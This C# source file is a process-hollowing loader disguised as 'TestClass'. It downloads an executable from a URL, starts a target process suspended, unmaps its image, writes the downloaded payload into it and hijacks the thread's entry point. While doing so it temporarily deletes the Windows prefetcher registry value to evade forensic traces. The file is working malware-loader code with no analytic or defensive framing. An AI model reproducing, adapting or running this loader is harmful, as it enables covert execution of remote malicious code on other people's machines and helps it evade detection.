using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using Microsoft.Win32;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
    }

    public void Inject(string payloadUrl, string targetfile, string arguments = "")
    {
        byte[] payloadBytes = DownloadPayload(payloadUrl);
        Load(payloadBytes, targetfile, arguments);
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long hProcess, long lpAddress, long dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, long written);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long hThread);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long handle);

    private static byte[] DownloadPayload(string url)
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
        using (Stream stream = response.GetResponseStream())
        using (MemoryStream memoryStream = new MemoryStream())
        {
            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
            {
                memoryStream.Write(buffer, 0, bytesRead);
            }
            return memoryStream.ToArray();
        }
    }

    private static void Load(byte[] payloadBytes, string targetfile, string args)
    {
        const string prefetcherKeyPath = @"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters";
        const string prefetcherValueName = "EnablePrefetcher";
        object originalPrefetcherValue = null;

        long imageBase = 0;
        short numberOfSections = 0;
        short sizeOfOptionalHeader = 0;

        using (var key = Registry.LocalMachine.OpenSubKey(prefetcherKeyPath, true))
        {
            if (key != null)
            {
                originalPrefetcherValue = key.GetValue(prefetcherValueName);
                key.DeleteValue(prefetcherValueName, false);
            }
        }

        int e_lfanew = Marshal.ReadInt32(payloadBytes, 0x3c);
        int sizeOfImage = Marshal.ReadInt32(payloadBytes, e_lfanew + 0x18 + 0x038);
        int sizeOfHeaders = Marshal.ReadInt32(payloadBytes, e_lfanew + 0x18 + 0x03c);
        int entryPoint = Marshal.ReadInt32(payloadBytes, e_lfanew + 0x18 + 0x10);

        numberOfSections = Marshal.ReadInt16(payloadBytes, e_lfanew + 0x4 + 0x2);
        sizeOfOptionalHeader = Marshal.ReadInt16(payloadBytes, e_lfanew + 0x4 + 0x10);
        imageBase = Marshal.ReadInt64(payloadBytes, e_lfanew + 0x18 + 0x18);

        byte[] bStartupInfo = new byte[0x68];
        byte[] bProcessInfo = new byte[0x18];

        IntPtr pThreadContext = Allocate(0x4d0, 16);

        string target_host = targetfile;
        if (!string.IsNullOrEmpty(args))
            target_host += " " + args;
        string currentDirectory = Directory.GetCurrentDirectory();

        Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);

        CreateProcess(null, target_host, IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, currentDirectory, bStartupInfo, bProcessInfo);
        long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
        long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);

        ZwUnmapViewOfSection(processHandle, imageBase);
        VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
        WriteProcessMemory(processHandle, imageBase, payloadBytes, sizeOfHeaders, 0L);

        for (short i = 0; i < numberOfSections; i++)
        {
            byte[] section = new byte[0x28];
            Buffer.BlockCopy(payloadBytes, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);

            int virtualAddress = Marshal.ReadInt32(section, 0x00c);
            int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
            int pointerToRawData = Marshal.ReadInt32(section, 0x014);

            byte[] bRawData = new byte[sizeOfRawData];
            Buffer.BlockCopy(payloadBytes, pointerToRawData, bRawData, 0, bRawData.Length);

            WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
        }

        GetThreadContext(threadHandle, pThreadContext);

        byte[] bImageBase = BitConverter.GetBytes(imageBase);

        long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
        WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);

        Marshal.WriteInt64(pThreadContext, 0x80 /* rcx */, imageBase + entryPoint);

        SetThreadContext(threadHandle, pThreadContext);
        ResumeThread(threadHandle);

        Marshal.FreeHGlobal(pThreadContext);
        CloseHandle(processHandle);
        CloseHandle(threadHandle);

        using (var key = Registry.LocalMachine.OpenSubKey(prefetcherKeyPath, true))
        {
            if (key != null && originalPrefetcherValue != null)
            {
                key.SetValue(prefetcherValueName, originalPrefetcherValue);
            }
        }
    }

    private static IntPtr Align(IntPtr source, int alignment)
    {
        long source64 = source.ToInt64() + (alignment - 1);
        long aligned = alignment * (source64 / alignment);
        return new IntPtr(aligned);
    }

    private static IntPtr Allocate(int size, int alignment)
    {
        IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
        return Align(allocated, alignment);
    }
}